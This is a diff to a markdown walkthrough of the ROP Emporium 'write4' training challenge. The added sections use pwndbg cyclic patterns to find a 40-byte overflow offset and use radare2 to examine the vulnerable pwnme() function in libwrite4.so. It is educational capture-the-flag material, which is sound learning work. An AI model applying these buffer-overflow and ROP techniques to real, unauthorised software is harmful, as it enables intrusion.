@@ -1,3 +1,4 @@
+
 # Write4 - ROP Emporium Walkthrough
 
 ![ROP Emporium](https://github.com/NationalSecurityAgency/ghidra/blob/master/Ghidra/Features/Base/src/main/resources/images/GHIDRA_3.png?raw=true)
@@ -68,7 +69,83 @@ It calls `print_file` with `"nonexistent"`. Our goal is to replace this string w
 
 ---
 
-## 2. Finding Gadgets
+## 2. Finding the Offset with pwndbg
+
+Before building the ROP chain, we need to find the exact offset to control the return address.
+
+### Load the binary in pwndbg
+
+```bash
+pwndbg ./write4
+```
+
+### Generate a cyclic pattern
+
+```bash
+pwndbg> cyclic 100
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
+```
+
+### Run and crash
+
+```bash
+pwndbg> run
+# ... program asks for input, paste the pattern ...
+```
+
+### Analyze the crash
+
+```
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7c00942 in pwnme () from ./libwrite4.so
+...
+RBP  0x6161616161616165 ('eaaaaaaa')
+RSP  0x7fffffffd9f8 ◂— 0x6161616161616166 ('faaaaaaa')
+RIP  0x7ffff7c00942 (pwnme+152) ◂— ret
+```
+
+We crashed in `pwnme()` (from `libwrite4.so`) and the stack is filled with our pattern.
+
+### Find the exact offset
+
+```bash
+pwndbg> cyclic -l faaaaaaa
+Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
+Found at offset 40
+```
+
+**Offset = 40 bytes** before we control the return address.
+
+---
+
+## 3. Understanding pwnme() and print_file()
+
+Since `pwnme` is in `libwrite4.so`, we need to analyze the library:
+
+```bash
+# Find the library
+ldd write4
+linux-vdso.so.1 (0x00007ffff7fc4000)
+libwrite4.so => ./libwrite4.so
+
+# Analyze with radare2
+r2 -A libwrite4.so
+
+[0x00001060]> afl | grep pwnme
+sym.pwnme            | 152
+
+[0x00001060]> pdf @ sym.pwnme
+# ... shows buffer allocation and call to fgets/read ...
+```
+
+The crash confirms:
+- The buffer overflow happens in `pwnme()`
+- We control 40 bytes before the return address
+- `print_file()` is available at `0x400510`
+
+---
+
+## 4. Finding Gadgets
 
 ### Writable Sections
 
@@ -105,7 +182,7 @@ We have everything we need:
 
 ---
 
-## 3. Attack Strategy
+## 5. Attack Strategy
 
 ### 3-Step Plan
 
@@ -143,7 +220,7 @@ We have everything we need:
 
 ---
 
-## 4. Python Exploit
+## 6. Python Exploit
 
 ### Manual Version (with p64)
 
@@ -202,7 +279,7 @@ print(io.recvall().decode())
 
 ---
 
-## 5. Execution
+## 7. Execution
 
 ```bash
 $ python3 exploit.py
@@ -227,7 +304,7 @@ ROPE{a_placeholder_32byte_flag!}
 
 ---
 
-## 6. Detailed Explanation
+## 8. Detailed Explanation
 
 ### Why Twice the .data Address?
 
@@ -261,13 +338,27 @@ These are two different operations that need the same address!
 
 ---
 
-## 7. Conclusion
+## 9. What We Learned About libwrite4.so
+
+Using `pwndbg` and `radare2` on `libwrite4.so` confirmed:
+- The vulnerable function `pwnme()` lives in the library
+- It contains a buffer overflow that we control
+- The crash happens inside `pwnme()`, then returns to our controlled address
+- `print_file()` is imported from the library and available at `0x400510`
+
+This shows that even when the vulnerable code is in a separate library, ROP still works the same way!
+
+---
+
+## 10. Conclusion
 
 Write4 teaches us how to:
 - Find ROP gadgets
 - Perform arbitrary memory writes
 - Build complex ROP chains
 - Use pwntools like a pro
+- Debug with pwndbg to find offsets
+- Analyze libraries with radare2
 
 The next challenge, **badchars**, adds a difficulty: forbidden characters! But with the foundations we have now, we're ready!
 
@@ -278,7 +369,8 @@ The next challenge, **badchars**, adds a difficulty: forbidden characters! But w
 - [ROP Emporium](https://ropemporium.com/)
 - [pwntools documentation](https://docs.pwntools.com/)
 - [radare2 book](https://radare.gitbooks.io/radare2book/content/)
+- [pwndbg](https://github.com/pwndbg/pwndbg)
 
 ---
 
-*scaramouch* 
+*scaramouch*
